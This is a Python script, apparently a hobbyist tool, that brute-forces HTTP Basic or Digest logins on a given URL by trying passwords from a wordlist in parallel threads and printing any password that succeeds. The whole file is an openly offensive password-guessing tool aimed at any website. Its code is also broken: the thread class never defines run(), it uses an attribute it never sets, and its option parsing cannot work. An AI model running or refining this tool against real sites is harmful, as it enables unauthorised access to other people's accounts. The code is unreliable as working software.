from requests import *
from threading import Thread
import sys
import time
from getopt import *
from requests.auth import HTTPDigestAuth
from termcolor import cprint
import colorama

colorama.init()

global hit 
hit = "1"

def usage():
    cprint (""" Usage:-

        -us  ===  Username,
        -ur  ===  URL (http://website.com)
        -pf  ===  Password file
        -me  ===  Method of bruteforcing (basic or digest)
        -th  ===  Number of threads""", 'blue')

class req_perform(Thread):
    def __init__(self, passw, user, url, met):
        Thread.__init__(self)
        self.passwd = passw.split("\n")[0]
        self.usern = user
        self.url = url
        self.meth = met
        cprint(f"Password being tried: {self.passwd}", 'cyan')

    def main(self):
        global hit
        if hit == "1":
            try:
                if self.met == "basic":
                    r = get(self.url, auth=(self.usern, self.passwd))
                    
                elif self.met == "digest":
                    r = get(self.url, auth=HTTPDigestAuth(self.usern, 
                    self.passwd))
                    
                if r.status_code == 200:
                    hit = "0"
                    cprint(f"Password found!: {self.passwd}", 'green')
                    sys.exit()
                else:
                    cprint(f"Not valid password: {self.passwd}", 'red')
                    i[0] = i[0] - 1
            except Exception as e:
                cprint(e, 'red')

def l_threads(passw, th, user, url, met):
    global i
    i = []
    i.append(0)
    while len(passw):
        if hit == "1":
            try:
                if i[0] < th:
                    passwd = passw.pop(0)
                    i[0] = i[0] + 1
                    t = req_perform(passwd, user, url, met)
                    t.start()
            except KeyboardInterrupt:
                cprint("Quiting because of keyboard interrupt...", 'yellow')
                sys.exit()
            t.join()

def start(argv):
    if len(sys.argv) < 5:
        usage()
        sys.exit()

    try:
        opts, args = getopt(argv, "us:ur:pf:me:th")
    
    except GetoptError:
        cprint("Error while parsing arguements! Quiting...", 'red')
        sys.exit()

    for opt, arg in opts:
        if opt == '-us':
            user = arg
        elif opt == '-ur':
            url = arg
        elif opt == '-pf':
            dicti = arg
        elif opt == '-me':
            method = arg
        elif opt == '-th':
            thread = arg

    try:
        f = open(dicti, "r")
        passw = f.readlines()
    except:
        cprint(f"File doesn't exist or the file path is wrong. Please try again!", 'red')
        sys.exit()

    l_threads(passw, thread, user, url, method)
    
if __name__ == '__main__':
    try:
        start(sys.argv[1:])
        
    except KeyboardInterrupt:
        print("Program interrupted. Quiting...")
        time.sleep(1)
        sys.exit()
